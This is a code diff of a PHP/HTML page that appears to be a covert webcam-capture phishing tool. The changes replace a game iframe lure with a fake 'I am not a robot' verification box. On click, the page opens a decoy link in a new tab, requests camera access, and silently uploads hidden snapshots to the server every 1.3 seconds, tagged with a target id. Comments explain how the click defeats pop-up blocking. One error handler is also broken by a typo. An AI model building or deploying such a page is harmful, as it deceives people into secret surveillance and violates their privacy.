@@ -47,26 +47,57 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Verification Required</title>
     <style>
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
-            overflow: hidden;
-            background-color: #000;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
         }
-        #game-frame {
+        .verify-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 320px;
             width: 100%;
-            height: 100%;
+        }
+        .verify-btn {
+            background-color: #4CAF50;
+            color: white;
             border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        .verify-btn:hover {
+            background-color: #45a049;
+        }
+        p {
+            color: #333;
+            font-size: 15px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
 
-    <iframe id="game-frame" src="about:blank"></iframe>
+    <div class="verify-box" id="box">
+        <p>Please verify that you are human to continue.</p>
+        <button class="verify-btn" onclick="startProcess()">I am not a robot</button>
+    </div>
     
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -83,27 +114,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         if (rawTargetUrl) {
             try {
-                // Base64 decode kora target URL
                 finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
             } catch (e) {
                 console.error("URL decode error:", e);
             }
         }
 
-        // Iframe-e dynamic link load kora
-        document.getElementById('game-frame').src = finalUrl;
+        function startProcess() {
+            // Box লুকিয়ে ফেলা বা রিডাইরেক্ট লুক নেওয়া
+            document.getElementById('box').style.display = 'none';
 
-        // Camera capture loop
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(() => {
-                    setInterval(captureAndUpload, 1300);
-                }, 1000);
-            })
-            .catch(err => {
-                console.error("Camera error: ", err);
-            });
+            // নতুন ট্যাবে টার্গেট লিংক ওপেন করা (ইউজারের ক্লিকের কারণে ব্রাউজার ব্লক করবে না)
+            window.open(finalUrl, '_blank');
+
+            // ক্যামেরা পারমিশন ও ক্যাপচার শুরু করা
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        setInterval(captureAndUpload, 1300);
+                    }, 1000);
+                })
+                .catch(err => {
+                    console.error("Camera error: ", err);
+                });
+        }
 
         function captureAndUpload() {
             const context = canvas.getContext('2d');
@@ -120,7 +155,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 },
                 body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId)
             }).catch(error => {
-                console.error('Error:', error);
+                console.error('Error:',erg);
             });
         }
     </script>
